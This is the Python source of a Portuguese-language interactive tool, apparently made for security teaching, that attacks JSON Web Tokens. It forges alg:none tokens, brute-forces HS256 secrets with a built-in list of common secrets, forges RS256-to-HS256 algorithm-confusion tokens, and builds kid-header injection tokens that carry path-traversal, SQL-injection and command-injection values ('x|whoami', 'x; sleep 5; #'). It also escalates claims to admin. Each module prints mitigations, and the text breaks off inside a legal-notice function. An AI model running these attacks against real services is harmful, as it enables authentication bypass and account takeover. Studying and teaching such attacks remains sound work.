

import os
import sys
import json
import time
import hmac
import base64
import hashlib
import argparse
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ----------------------------------------------------------------------------
# Dependências
# ----------------------------------------------------------------------------
try:
    from colorama import Fore, Style, init as _colorama_init
    _colorama_init(autoreset=True)
except ImportError:
    print("[!] Dependência ausente: colorama")
    print("    Instale com:  pip install colorama")
    sys.exit(1)

# 'cryptography' é OPCIONAL: usada só para gerar uma chave RSA de demonstração
# no módulo de confusão de algoritmo. A forja em si é puro HMAC (stdlib).
try:
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# ----------------------------------------------------------------------------
# Identidade visual — "Terminal Verde"
# ----------------------------------------------------------------------------
GREEN = Fore.GREEN
CYAN = Fore.CYAN
YELLOW = Fore.YELLOW
RED = Fore.RED
DIM = Style.DIM
BRIGHT = Style.BRIGHT
RESET = Style.RESET_ALL

# Claims considerados sensíveis (destacados em amarelo na inspeção)
SENSITIVE = {
    "role", "roles", "admin", "isadmin", "is_admin", "user", "username",
    "sub", "iss", "aud", "iat", "exp", "nbf", "scope", "scopes",
    "permissions", "groups", "authorities", "level",
}

# Wordlist embutida de secrets HS256 mais comuns (usada quando o usuário não
# fornece uma wordlist própria). ~50 clássicas.
SECRETS_COMUNS = [
    "secret", "password", "123456", "12345678", "123456789", "admin", "key",
    "jwt", "token", "supersecret", "your-256-bit-secret", "your_jwt_secret",
    "changeme", "default", "test", "qwerty", "letmein", "root", "pass",
    "p@ssw0rd", "secretkey", "secret_key", "private", "privatekey", "jwtsecret",
    "jwt_secret", "mysecret", "my-secret", "s3cr3t", "s3cr3tk3y", "hello",
    "welcome", "iloveyou", "abc123", "1234567890", "passw0rd", "secret123",
    "Password1", "admin123", "god", "ninja", "master", "shadow", "dragon",
    "111111", "000000", "secretpassword", "verysecret", "topsecret", "key123",
]

# ============================================================================
#  NÚCLEO JWT  — todas as funções de codificação/assinatura ficam aqui.
#  Tudo é feito na mão (sem PyJWT) para podermos manipular livremente os tokens.
# ============================================================================

def b64url_encode(data):
    """Base64 URL-safe SEM padding (=), como exige o padrão JWT."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(data):
    """Base64 URL-safe tolerante: recoloca o padding '=' que o JWT remove.
    Sem isso, MUITOS tokens reais quebrariam ao decodificar."""
    if isinstance(data, str):
        data = data.encode("ascii")
    falta = len(data) % 4
    if falta:
        data += b"=" * (4 - falta)
    return base64.urlsafe_b64decode(data)


def split_jwt(token):
    """Separa o token em (header_b64, payload_b64, signature_b64) e valida
    que existem exatamente 3 partes separadas por ponto."""
    token = (token or "").strip()
    partes = token.split(".")
    if len(partes) != 3:
        raise ValueError(
            "Token JWT inválido: esperadas 3 partes separadas por '.' "
            f"(encontradas {len(partes)})."
        )
    return partes[0], partes[1], partes[2]


def decode_header(token):
    h64, _, _ = split_jwt(token)
    return json.loads(b64url_decode(h64))


def decode_payload(token):
    _, p64, _ = split_jwt(token)
    return json.loads(b64url_decode(p64))


def sign_hs256(header_b64, payload_b64, secret):
    """Calcula a assinatura HMAC-SHA256 de 'header.payload' com a secret dada.
    Retorna a assinatura já em base64url. Coração do bruteforce e da forja."""
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    mensagem = f"{header_b64}.{payload_b64}".encode("ascii")
    assinatura = hmac.new(secret, mensagem, hashlib.sha256).digest()
    return b64url_encode(assinatura)


def build_jwt(header, payload, secret=None, alg=None):
    """Monta um JWT completo. Se alg='none', devolve com assinatura vazia.
    Caso contrário assina em HS256 com a secret (vazia se None)."""
    header = dict(header)
    if alg is not None:
        header["alg"] = alg
    h64 = b64url_encode(json.dumps(header, separators=(",", ":")))
    p64 = b64url_encode(json.dumps(payload, separators=(",", ":")))
    if str(header.get("alg", "")).lower() == "none":
        return f"{h64}.{p64}."
    sig = sign_hs256(h64, p64, secret if secret is not None else "")
    return f"{h64}.{p64}.{sig}"


def gerar_token_demo():
    """JWT HS256 de demonstração, assinado com a secret 'secret'.
    Serve para gravar o vídeo sem depender de um alvo externo."""
    agora = int(time.time())
    payload = {"user": "joao", "role": "user", "iat": agora, "exp": agora + 3600}
    return build_jwt({"alg": "HS256", "typ": "JWT"}, payload, "secret")


# ============================================================================
#  HELPERS DE INTERFACE
# ============================================================================

def limpar():
    os.system("cls" if os.name == "nt" else "clear")


def ler(prompt=""):
    """input() centralizado: trata Ctrl+C (sai limpo) e EOF (string vazia)."""
    try:
        return input(prompt)
    except EOFError:
        return ""
    except KeyboardInterrupt:
        sair()


def ok(msg):    print(f"{GREEN}[+]{RESET} {msg}")
def info(msg):  print(f"{CYAN}[*]{RESET} {msg}")
def warn(msg):  print(f"{YELLOW}[!]{RESET} {msg}")
def erro(msg):  print(f"{RED}[!]{RESET} {msg}")


def pausa():
    ler(f"\n{DIM}[ENTER para continuar]{RESET}")


def sair():
    print(f"\n{GREEN}[+]{RESET} Saindo. Hackeie com responsabilidade. "
          f"{DIM}— CyberGuard Academy{RESET}\n")
    sys.exit(0)


def banner():
    W = 45
    topo = "╔" + "═" * W + "╗"
    base = "╚" + "═" * W + "╝"

    def linha(txt, cor):
        return (f"{GREEN}{BRIGHT}║{RESET}{cor}{txt.center(W)}{RESET}"
                f"{GREEN}{BRIGHT}║{RESET}")

    print(f"{GREEN}{BRIGHT}{topo}{RESET}")
    print(linha("J W T F O R G E   B R", GREEN + BRIGHT))
    print(linha("Exploração de JSON Web Tokens · v1.0", DIM))
    print(linha("CyberGuard Academy · github.com/Kalyel473", DIM))
    print(f"{GREEN}{BRIGHT}{base}{RESET}\n")


def secao(titulo):
    limpar()
    banner()
    print(f"{GREEN}{'─' * 54}{RESET}")
    print(f"  {BRIGHT}{titulo}{RESET}")
    print(f"{GREEN}{'─' * 54}{RESET}\n")


def bloco_como_funciona(linhas):
    print(f"{CYAN}{BRIGHT}📖 COMO FUNCIONA{RESET}")
    for l in linhas:
        print(f"   {DIM}{l}{RESET}")
    print()


def bloco_mitigacao(linhas):
    print(f"\n{GREEN}{BRIGHT}🛡️  MITIGAÇÃO{RESET}")
    for l in linhas:
        print(f"   {GREEN}•{RESET} {l}")


def fmt_ts(ts):
    return datetime.fromtimestamp(int(ts)).strftime("%d/%m/%Y %H:%M:%S")


def humanizar_segundos(s):
    s = int(s)
    if s < 0:
        return "0s"
    d, s = divmod(s, 86400)
    h, s = divmod(s, 3600)
    m, s = divmod(s, 60)
    partes = []
    if d:
        partes.append(f"{d}d")
    if h:
        partes.append(f"{h}h")
    if m:
        partes.append(f"{m}min")
    if not partes:
        partes.append(f"{s}s")
    return " ".join(partes)


def print_json_destacado(d, indent="  "):
    """Imprime um dict como JSON colorido, com claims sensíveis em amarelo."""
    if not d:
        print(f"{indent}{DIM}{{}}{RESET}")
        return
    print(f"{indent}{DIM}{{{RESET}")
    itens = list(d.items())
    for i, (k, v) in enumerate(itens):
        virg = "," if i < len(itens) - 1 else ""
        cor_k = YELLOW if str(k).lower() in SENSITIVE else CYAN
        valor = json.dumps(v, ensure_ascii=False)
        print(f"{indent}  {cor_k}\"{k}\"{RESET}: {GREEN}{valor}{RESET}{virg}")
    print(f"{indent}{DIM}}}{RESET}")


def converter_valor(s):
    """Converte a string digitada no editor para o tipo provável
    (bool, null, int, float, JSON, ou string)."""
    t = s.strip()
    if t.lower() == "true":
        return True
    if t.lower() == "false":
        return False
    if t.lower() in ("null", "none"):
        return None
    for cast in (int, float):
        try:
            return cast(t)
        except ValueError:
            pass
    if t.startswith(("{", "[")):
        try:
            return json.loads(t)
        except ValueError:
            pass
    return s


def mostrar_diff(antigo, novo):
    """Mostra o antes → depois dos claims alterados (ótimo no vídeo)."""
    todas = set(antigo) | set(novo)
    print(f"\n{BRIGHT}Alterações no payload:{RESET}")
    houve = False
    for k in sorted(todas, key=str):
        if antigo.get(k) != novo.get(k):
            houve = True
            va = json.dumps(antigo[k], ensure_ascii=False) if k in antigo else "∅"
            vn = json.dumps(novo[k], ensure_ascii=False) if k in novo else "∅"
            print(f"  {CYAN}{k}{RESET}: {YELLOW}{va}{RESET} → {GREEN}{vn}{RESET}")
    if not houve:
        print(f"  {DIM}(nenhuma alteração){RESET}")


# ============================================================================
#  EDITOR DE CLAIMS  (reutilizado pelos módulos 2, 4, 5 e 6)
# ============================================================================

def editar_claims(payload_inicial):
    payload = dict(payload_inicial)
    while True:
        secao("EDITOR DE CLAIMS")
        chaves = list(payload.keys())
        if not chaves:
            print(f"  {DIM}(payload vazio){RESET}")
        for i, k in enumerate(chaves, 1):
            cor_k = YELLOW if str(k).lower() in SENSITIVE else CYAN
            valor = json.dumps(payload[k], ensure_ascii=False)
            print(f"  {GREEN}[{i}]{RESET} {cor_k}{k}{RESET} = {valor}")
        print()
        print(f"  {DIM}Opções:{RESET}")
        print(f"   {CYAN}[nº]{RESET} editar   {CYAN}a{RESET} adicionar   "
              f"{CYAN}d{RESET} remover")
        print(f"   {CYAN}admin{RESET} virar admin   {CYAN}exp{RESET} renovar "
              f"validade   {CYAN}delexp{RESET} remover exp")
        print(f"   {GREEN}ok{RESET} concluir")
        op = ler(f"\n{GREEN}[>]{RESET} ").strip().lower()

        if op == "ok":
            return payload

        elif op == "admin":
            payload["role"] = "admin"
            payload["isAdmin"] = True
            ok("Aplicado: role=admin, isAdmin=true")
            pausa()

        elif op == "exp":
            v = ler("Validade em horas (ENTER = 24): ").strip()
            try:
                horas = float(v) if v else 24.0
            except ValueError:
                horas = 24.0
            payload["exp"] = int(time.time() + horas * 3600)
            ok(f"exp renovado para daqui a {humanizar_segundos(horas * 3600)}")
            pausa()

        elif op == "delexp":
            if payload.pop("exp", None) is not None:
                ok("Claim 'exp' removido — o token não expira.")
            else:
                warn("Não havia claim 'exp'.")
            pausa()

        elif op == "a":
            nome = ler("Nome do novo claim: ").strip()
            if nome:
                valor = ler("Valor: ")
                payload[nome] = converter_valor(valor)
                ok(f"Claim '{nome}' adicionado.")
            pausa()

        elif op == "d":
            idx = ler("Número do claim a remover: ").strip()
            if idx.isdigit() and 1 <= int(idx) <= len(chaves):
                rem = chaves[int(idx) - 1]
                payload.pop(rem, None)
                ok(f"Claim '{rem}' removido.")
            else:
                erro("Número inválido.")
            pausa()

        elif op.isdigit() and 1 <= int(op) <= len(chaves):
            k = chaves[int(op) - 1]
            novo = ler(f"Novo valor para '{k}': ")
            payload[k] = converter_valor(novo)
            ok(f"Claim '{k}' atualizado.")
            pausa()

        else:
            erro("Opção inválida.")
            pausa()


# ============================================================================
#  MÓDULO 1 — DECODIFICAR E INSPECIONAR
# ============================================================================

def inspecionar_token(token):
    try:
        h64, p64, sig = split_jwt(token)
        header = json.loads(b64url_decode(h64))
        payload = json.loads(b64url_decode(p64))
    except Exception as e:
        erro(f"Não foi possível decodificar o token: {e}")
        return

    info("JWT é CODIFICADO (Base64url), não criptografado — "
         "qualquer um lê o conteúdo.\n")

    # ---- HEADER ----
    print(f"{BRIGHT}┌─ HEADER {DIM}(algoritmo / metadados){RESET}")
    print_json_destacado(header)
    alg = str(header.get("alg", ""))
    if alg.lower() == "none":
        print(f"  {RED}⚠ alg=none → assinatura pode não ser verificada "
              f"(CRÍTICO){RESET}")
    elif alg.upper().startswith("HS"):
        print(f"  {YELLOW}→ {alg}: HMAC com secret compartilhada "
              f"(alvo de bruteforce){RESET}")
    elif alg.upper().startswith(("RS", "ES", "PS")):
        print(f"  {CYAN}→ {alg}: assinatura assimétrica "
              f"(chave pública/privada){RESET}")
    if "kid" in header:
        print(f"  {YELLOW}→ kid presente: {header['kid']!r} "
              f"(possível injeção){RESET}")
    print()

    # ---- PAYLOAD ----
    print(f"{BRIGHT}┌─ PAYLOAD {DIM}(claims / dados){RESET}")
    print_json_destacado(payload)
    print()

    # ---- TEMPO ----
    print(f"{BRIGHT}┌─ ANÁLISE DE TEMPO{RESET}")
    agora = int(time.time())
    if "iat" in payload:
        try:
            print(f"  {CYAN}iat{RESET} (emitido em):  {fmt_ts(payload['iat'])}")
        except Exception:
            pass
    if "nbf" in payload:
        try:
            print(f"  {CYAN}nbf{RESET} (válido após): {fmt_ts(payload['nbf'])}")
        except Exception:
            pass
    if "exp" in payload:
        try:
            exp = int(payload["exp"])
            if exp < agora:
                print(f"  {RED}exp (expira em):  {fmt_ts(exp)} → "
                      f"EXPIRADO há {humanizar_segundos(agora - exp)}{RESET}")
            else:
                print(f"  {GREEN}exp (expira em):  {fmt_ts(exp)} → "
                      f"válido (faltam {humanizar_segundos(exp - agora)}){RESET}")
        except Exception:
            pass
    else:
        print(f"  {YELLOW}exp: ausente → o token NÃO expira{RESET}")
    print()

    # ---- ASSINATURA ----
    print(f"{BRIGHT}┌─ ASSINATURA{RESET}")
    print(f"  {GREEN}{sig if sig else '(vazia)'}{RESET}")


def modulo_inspecionar(token):
    secao("MÓDULO 1 · DECODIFICAR E INSPECIONAR")
    bloco_como_funciona([
        "O JWT tem 3 partes: header.payload.assinatura, todas em Base64url.",
        "Header e payload são apenas codificados — dá pra ler tudo sem a chave.",
        "Vamos extrair claims, checar expiração e apontar fraquezas óbvias.",
    ])
    inspecionar_token(token)


# ============================================================================
#  MÓDULO 2 — ATAQUE alg:none
# ============================================================================

def gerar_tokens_none(payload):
    p64 = b64url_encode(json.dumps(payload, separators=(",", ":")))
    out = []
    for alg in ["none", "None", "NONE", "nOnE"]:
        header = {"alg": alg, "typ": "JWT"}
        h64 = b64url_encode(json.dumps(header, separators=(",", ":")))
        out.append((alg, f"{h64}.{p64}."))
    return out


def modulo_alg_none(token):
    secao("MÓDULO 2 · ATAQUE alg:none")
    bloco_como_funciona([
        "Alguns servidores aceitam o header alg='none' e NÃO verificam a",
        "assinatura. Aí basta remover a assinatura e forjar o payload que",
        "quiser. Testamos também variações de caixa (None/NONE) para driblar",
        "blacklists ingênuas.",
    ])
    try:
        payload = decode_payload(token)
    except Exception as e:
        erro(f"Token inválido: {e}")
        return

    original = dict(payload)
    info("Edite os claims que você quer forjar (ex.: role → admin):")
    pausa()
    payload = editar_claims(payload)

    secao("MÓDULO 2 · TOKENS FORJADOS (alg:none)")
    mostrar_diff(original, payload)
    print(f"\n{BRIGHT}Tokens forjados (assinatura vazia):{RESET}")
    for alg, tok in gerar_tokens_none(payload):
        print(f"\n  {CYAN}alg = {alg}{RESET}")
        print(f"  {GREEN}{tok}{RESET}")
    bloco_mitigacao([
        "Rejeitar explicitamente alg='none' no servidor.",
        "Usar uma allowlist de algoritmos aceitos (ex.: só HS256 ou só RS256).",
    ])


# ============================================================================
#  MÓDULO 3 — BRUTEFORCE DE SECRET (HS256)
# ============================================================================

def _chunks(iteravel, n):
    chunk = []
    for x in iteravel:
        chunk.append(x)
        if len(chunk) >= n:
            yield chunk
            chunk = []
    if chunk:
        yield chunk


def carregar_wordlist(caminho):
    """Generator: lê a wordlist em streaming (não carrega tudo na RAM)."""
    with open(caminho, "r", encoding="utf-8", errors="ignore") as f:
        for linha in f:
            yield linha.rstrip("\n\r")


def _print_progresso(n, inicio):
    dt = time.time() - inicio
    taxa = n / dt if dt > 0 else 0
    print(f"\r{CYAN}[*]{RESET} Testadas {GREEN}{n:,}{RESET} secrets  "
          f"·  {taxa:,.0f}/s", end="", flush=True)


def bruteforce_secret(token, wordlist_path=None, mostrar_progresso=True):
    """Ataque de dicionário contra a secret HS256. Multithreaded, com parada
    imediata ao encontrar. Retorna a secret (str) ou None."""
    try:
        h64, p64, sig = split_jwt(token)
    except ValueError as e:
        erro(str(e))
        return None

    found = {"secret": None}
    stop = threading.Event()
    contador = {"n": 0}
    lock = threading.Lock()

    def testar_chunk(chunk):
        achou = None
        for cand in chunk:
            if stop.is_set():
                break
            if hmac.compare_digest(sign_hs256(h64, p64, cand), sig):
                achou = cand
                stop.set()
                break
        with lock:
            contador["n"] += len(chunk)
        if achou is not None:
            found["secret"] = achou

    fonte = carregar_wordlist(wordlist_path) if wordlist_path \
        else iter(SECRETS_COMUNS)

    inicio = time.time()
    CHUNK, WORKERS = 1500, 8
    try:
        with ThreadPoolExecutor(max_workers=WORKERS) as ex:
            onda = []
            for chunk in _chunks(fonte, CHUNK):
                if stop.is_set():
                    break
                onda.append(ex.submit(testar_chunk, chunk))
                if len(onda) >= WORKERS:
                    for fut in onda:
                        fut.result()
                    onda = []
                    if mostrar_progresso:
                        _print_progresso(contador["n"], inicio)
            for fut in onda:
                fut.result()
    except FileNotFoundError:
        erro("Wordlist não encontrada.")
        return None

    if mostrar_progresso:
        _print_progresso(contador["n"], inicio)
        print()
    return found["secret"]


def modulo_bruteforce(token):
    secao("MÓDULO 3 · BRUTEFORCE DE SECRET (HS256)")
    bloco_como_funciona([
        "Em HS256 a assinatura é HMAC-SHA256(header.payload, SECRET).",
        "Se a secret for fraca (palavra de dicionário), testamos candidatas:",
        "para cada uma, recalculamos a assinatura e comparamos com a real.",
        "Quando bate, descobrimos a secret — e podemos forjar QUALQUER token.",
    ])
    try:
        header = decode_header(token)
    except Exception as e:
        erro(f"Token inválido: {e}")
        return None

    alg = str(header.get("alg", "")).upper()
    if not alg.startswith("HS"):
        warn(f"O token usa alg={alg or '?'}. O bruteforce HMAC se aplica a "
             f"HS256/HS384/HS512.")
        if ler("Continuar mesmo assim? (s/N) ").strip().lower() != "s":
            return None

    caminho = ler("Caminho da wordlist (ENTER = lista embutida de comuns): ").strip()
    if caminho and not os.path.isfile(caminho):
        erro("Arquivo não encontrado — usando a lista embutida.")
        caminho = None

    print()
    info("Iniciando ataque de dicionário...\n")
    secret = bruteforce_secret(token, caminho or None)

    if secret is not None:
        print()
        print(f"{GREEN}{BRIGHT}{'=' * 52}{RESET}")
        print(f"{GREEN}{BRIGHT}  [+] SECRET ENCONTRADA: {secret!r}{RESET}")
        print(f"{GREEN}{BRIGHT}{'=' * 52}{RESET}")
        bloco_mitigacao([
            "Usar uma secret longa e aleatória (≥ 256 bits), nunca de dicionário.",
            "Trocar a secret periodicamente e nunca versioná-la no código.",
        ])
        if ler("\nForjar um token com essa secret agora? (s/N) ").strip().lower() == "s":
            modulo_forjar(token, secret_conhecida=secret)
        return secret

    warn("Secret não encontrada na lista usada.")
    info("Tente uma wordlist maior (ex.: rockyou.txt) com a opção de caminho.")
    return None


# ============================================================================
#  MÓDULO 4 — CONFUSÃO DE ALGORITMO (RS256 → HS256)
# ============================================================================

def gerar_chave_demo():
    """Gera uma chave pública RSA de demonstração (requer cryptography)."""
    chave = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return chave.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def modulo_confusao(token):
    secao("MÓDULO 4 · CONFUSÃO DE ALGORITMO (RS256 → HS256)")
    bloco_como_funciona([
        "Em RS256 o servidor verifica com a CHAVE PÚBLICA (que é pública!).",
        "Se ele aceitar trocar o alg para HS256, ele vai usar essa mesma chave",
        "pública como SECRET do HMAC. Como o atacante também tem a chave",
        "pública, ele assina um token HS256 válido — sem nunca ver a privada.",
    ])

    print(f"{BRIGHT}Como fornecer a chave pública RSA?{RESET}")
    print(f"  {CYAN}[1]{RESET} Caminho de arquivo .pem/.pub")
    print(f"  {CYAN}[2]{RESET} Colar o conteúdo PEM")
    if HAS_CRYPTO:
        print(f"  {CYAN}[3]{RESET} Gerar uma chave de demonstração (para testar)")
    op = ler(f"\n{GREEN}[>]{RESET} ").strip()

    pub_bytes = None
    if op == "1":
        caminho = ler("Caminho do arquivo: ").strip()
        try:
            with open(caminho, "rb") as f:
                pub_bytes = f.read()
        except Exception as e:
            erro(f"Não foi possível ler o arquivo: {e}")
            return
    elif op == "2":
        print(f"{DIM}Cole a chave PEM e termine com uma linha contendo só END:{RESET}")
        linhas = []
        while True:
            l = ler()
            if l.strip() == "END":
                break
            linhas.append(l)
        pub_bytes = ("\n".join(linhas)).encode("utf-8")
    elif op == "3" and HAS_CRYPTO:
        pub_bytes = gerar_chave_demo()
        ok("Chave pública de demonstração gerada:")
        print(f"{DIM}{pub_bytes.decode()}{RESET}")
    else:
        erro("Opção inválida.")
        return

    if not pub_bytes or not pub_bytes.strip():
        erro("Chave pública vazia.")
        return

    try:
        payload = decode_payload(token)
    except Exception as e:
        erro(f"Token inválido: {e}")
        return

    original = dict(payload)
    info("Edite os claims que você quer forjar:")
    pausa()
    payload = editar_claims(payload)

    secao("MÓDULO 4 · TOKENS FORJADOS (confusão de algoritmo)")
    mostrar_diff(original, payload)

    header = {"alg": "HS256", "typ": "JWT"}
    h64 = b64url_encode(json.dumps(header, separators=(",", ":")))
    p64 = b64url_encode(json.dumps(payload, separators=(",", ":")))

    # Implementações divergem na formatação da chave; geramos variações.
    base = pub_bytes.rstrip(b"\n")
    variantes = {
        "PEM exato (como veio)": pub_bytes,
        "PEM sem \\n final": base,
        "PEM com \\n final": base + b"\n",
    }

    print(f"\n{BRIGHT}Tokens HS256 assinados com a chave pública como secret:{RESET}")
    vistos = set()
    for nome, kb in variantes.items():
        tok = f"{h64}.{p64}.{sign_hs256(h64, p64, kb)}"
        if tok in vistos:
            continue
        vistos.add(tok)
        print(f"\n  {CYAN}{nome}{RESET}")
        print(f"  {GREEN}{tok}{RESET}")

    bloco_mitigacao([
        "Vincular a verificação ao algoritmo esperado (não deixar o token decidir).",
        "Usar bibliotecas que separam chave de verificação por tipo de algoritmo.",
    ])


# ============================================================================
#  MÓDULO 5 — INJEÇÃO NO HEADER 'kid'
# ============================================================================

def modulo_kid(token):
    secao("MÓDULO 5 · INJEÇÃO NO HEADER 'kid'")
    bloco_como_funciona([
        "O campo 'kid' (Key ID) costuma indicar QUAL chave usar — e às vezes",
        "é usado direto num caminho de arquivo ou numa query SQL. Se for",
        "injetável, o atacante força o servidor a usar uma chave que ele",
        "controla (ou uma chave vazia), e então assina o token com ela.",
    ])
    try:
        payload = decode_payload(token)
    except Exception as e:
        erro(f"Token inválido: {e}")
        return

    original = dict(payload)
    info("Edite os claims que você quer forjar:")
    pausa()
    payload = editar_claims(payload)

    secao("MÓDULO 5 · TOKENS FORJADOS (injeção no kid)")
    mostrar_diff(original, payload)
    p64 = b64url_encode(json.dumps(payload, separators=(",", ":")))

    # (descrição, kid malicioso, secret usada para assinar)
    vetores = [
        ("Path Traversal → /dev/null (lê arquivo vazio = chave vazia)",
         "../../../../../../dev/null", ""),
        ("Path Traversal direto → /dev/null",
         "/dev/null", ""),
        ("SQL Injection (UNION devolve uma chave que o atacante escolhe)",
         "x' UNION SELECT 'attacker_key'-- -", "attacker_key"),
        ("Command Injection (detecção via whoami)",
         "x|whoami", ""),
        ("Command Injection time-based (atraso de 5s indica execução)",
         "x; sleep 5; #", ""),
    ]

    print(f"\n{BRIGHT}Um token forjado por vetor de injeção:{RESET}")
    for nome, kid, secret in vetores:
        header = {"alg": "HS256", "typ": "JWT", "kid": kid}
        h64 = b64url_encode(json.dumps(header, separators=(",", ":")))
        tok = f"{h64}.{p64}.{sign_hs256(h64, p64, secret)}"
        print(f"\n  {CYAN}{nome}{RESET}")
        print(f"  {DIM}kid:{RESET} {YELLOW}{kid}{RESET}")
        print(f"  {DIM}secret usada:{RESET} {YELLOW}{secret!r}{RESET}")
        print(f"  {GREEN}{tok}{RESET}")

    bloco_mitigacao([
        "Tratar 'kid' como dado não-confiável: nunca concatenar em path ou SQL.",
        "Usar uma allowlist de IDs de chave conhecidos e consultas parametrizadas.",
    ])


# ============================================================================
#  MÓDULO 6 — FORJAR TOKEN (com secret conhecida)
# ============================================================================

def modulo_forjar(token=None, secret_conhecida=None):
    secao("MÓDULO 6 · FORJAR TOKEN")
    bloco_como_funciona([
        "Com a secret em mãos (achada no bruteforce ou de um ambiente de teste),",
        "conseguimos assinar um token HS256 totalmente válido com os claims que",
        "quisermos — virar admin, renovar a expiração, mudar o usuário, etc.",
    ])

    if secret_conhecida is not None:
        secret = secret_conhecida
        info(f"Usando a secret descoberta: {secret!r}")
    else:
        secret = ler("Secret para assinar (ENTER = vazia): ")

    if token:
        try:
            payload = decode_payload(token)
        except Exception:
            payload = {}
    else:
        payload = {}

    original = dict(payload)
    payload = editar_claims(payload)

    alg = ler("Algoritmo (ENTER = HS256): ").strip().upper() or "HS256"

    secao("MÓDULO 6 · TOKEN FORJADO")
    if original:
        mostrar_diff(original, payload)

    if alg == "NONE":
        _, tok = gerar_tokens_none(payload)[0]
        valido = None
    else:
        header = {"alg": alg, "typ": "JWT"}
        tok = build_jwt(header, payload, secret)
        h64, p64, sig = split_jwt(tok)
        valido = hmac.compare_digest(sign_hs256(h64, p64, secret), sig)

    print(f"\n{BRIGHT}Token forjado:{RESET}")
    print(f"  {GREEN}{tok}{RESET}\n")
    if valido is True:
        ok("Assinatura validada: o token é internamente consistente.")
    elif valido is None:
        warn("alg=none: token sem assinatura (válido só onde 'none' for aceito).")


# ============================================================================
#  MÓDULO 7 — AUDITORIA COMPLETA
# ============================================================================

def auditar_token(token):
    """Roda todas as checagens passivas. Retorna lista de
    (severidade, mensagem, mitigacao)."""
    achados = []
    try:
        header = decode_header(token)
        payload = decode_payload(token)
    except Exception as e:
        return [("CRITICO", f"Token não pôde ser decodificado: {e}", "")]

    # --- algoritmo ---
    alg = str(header.get("alg", ""))
    if alg.lower() == "none":
        achados.append(("CRITICO", "alg=none: assinatura não é verificada.",
                        "Rejeitar 'none'; usar allowlist de algoritmos."))
    elif alg == "":
        achados.append(("CRITICO", "Header sem 'alg'.",
                        "Exigir algoritmo explícito e esperado."))
    elif alg.upper().startswith("HS"):
        fraca = bruteforce_secret(token, None, mostrar_progresso=False)
        if fraca is not None:
            achados.append(("CRITICO", f"Secret fraca encontrada: {fraca!r}.",
                            "Usar secret aleatória ≥ 256 bits."))
        else:
            achados.append(("OK", f"{alg}: secret não está na lista de comuns.", ""))
    else:
        achados.append(("OK", f"Algoritmo assimétrico ({alg}).", ""))

    # --- expiração ---
    agora = int(time.time())
    if "exp" not in payload:
        achados.append(("MEDIO", "Sem claim 'exp': o token não expira.",
                        "Definir expiração curta (ex.: 15min–1h)."))
    else:
        try:
            exp = int(payload["exp"])
            if exp < agora:
                achados.append(("OK", "Token já expirado.", ""))
            elif exp - agora > 7 * 86400:
                achados.append(("MEDIO", "Janela de validade longa (> 7 dias).",
                                "Reduzir o tempo de vida do token."))
            else:
                achados.append(("OK", "Expiração em janela razoável.", ""))
        except Exception:
            achados.append(("MEDIO", "Claim 'exp' em formato inesperado.",
                            "Usar timestamp Unix numérico."))

    # --- superfície de ataque no header ---
    for campo in ("kid", "jku", "x5u", "jwk", "x5c"):
        if campo in header:
            achados.append(("MEDIO",
                            f"Header '{campo}' presente (superfície de ataque).",
                            f"Validar/allowlist o campo '{campo}'."))

    # --- claims de autorização ---
    sens = [k for k in payload
            if str(k).lower() in {"role", "roles", "admin", "isadmin",
                                  "scope", "scopes", "permissions", "groups"}]
    if sens:
        achados.append(("INFO",
                        f"Claims de autorização no token: {', '.join(sens)}.",
                        "Validar no servidor; nunca confiar cegamente no token."))

    return achados


def imprimir_relatorio(achados):
    estilo = {
        "CRITICO": (RED, "🔴"),
        "MEDIO":   (YELLOW, "🟡"),
        "OK":      (GREEN, "🟢"),
        "INFO":    (CYAN, "🔵"),
    }
    for sev, msg, mit in achados:
        cor, emoji = estilo.get(sev, (RESET, "•"))
        print(f"  {emoji} {cor}{sev:<8}{RESET} {msg}")
        if mit:
            print(f"     {DIM}↳ mitigação: {mit}{RESET}")

    ncrit = sum(1 for s, _, _ in achados if s == "CRITICO")
    nmed = sum(1 for s, _, _ in achados if s == "MEDIO")
    nok = sum(1 for s, _, _ in achados if s in ("OK", "INFO"))
    print()
    print(f"  {BRIGHT}Placar:{RESET} {RED}{ncrit} crítico(s){RESET} · "
          f"{YELLOW}{nmed} médio(s){RESET} · {GREEN}{nok} ok/info{RESET}")


def modulo_auditoria(token):
    secao("MÓDULO 7 · AUDITORIA COMPLETA")
    bloco_como_funciona([
        "Roda todas as checagens passivas de uma vez e gera um relatório com",
        "severidade (🔴 crítico, 🟡 médio, 🟢 ok). Inclui um bruteforce rápido",
        "com a lista embutida para flagrar secrets fracas.",
    ])
    info("Analisando o token...\n")
    imprimir_relatorio(auditar_token(token))


# ============================================================================
#  CARREGAR / TROCAR TOKEN
# ============================================================================

def validar_token(t):
    split_jwt(t)
    decode_header(t)
    decode_payload(t)
    return t


def modulo_carregar():
    secao("CARREGAR / TROCAR TOKEN")
    print(f"  {CYAN}[1]{RESET} Colar um token")
    print(f"  {CYAN}[2]{RESET} Usar token de DEMONSTRAÇÃO (HS256, secret='secret')")
    print(f"  {CYAN}[3]{RESET} Carregar de um arquivo")
    op = ler(f"\n{GREEN}[>]{RESET} ").strip()

    t = None
    if op == "1":
        t = ler("Cole o token: ").strip()
    elif op == "2":
        t = gerar_token_demo()
        ok("Token de demonstração gerado.")
    elif op == "3":
        caminho = ler("Caminho do arquivo: ").strip()
        try:
            with open(caminho, "r", encoding="utf-8", errors="ignore") as f:
                t = f.read().strip()
        except Exception as e:
            erro(f"Não foi possível ler: {e}")
            return None
    else:
        erro("Opção inválida.")
        return None

    try:
        validar_token(t)
    except Exception as e:
        erro(f"Token inválido: {e}")
        return None

    ok("Token carregado com sucesso.")
    return t


# ============================================================================
#  MENU INTERATIVO
# ============================================================================

def aviso_legal_confirmar():
    print(f"{YELLOW}{BRIGHT}{'=' * 60}{RESET}")
    print(f"{YELLOW}{BRIGHT}  ⚠️  AVISO LEGAL — USO EDUCACIONAL E AUTORIZADO{RESET}")
    print(f"{YELLOW}{'=' * 60}{RESET}")
    print(f"""{DIM}
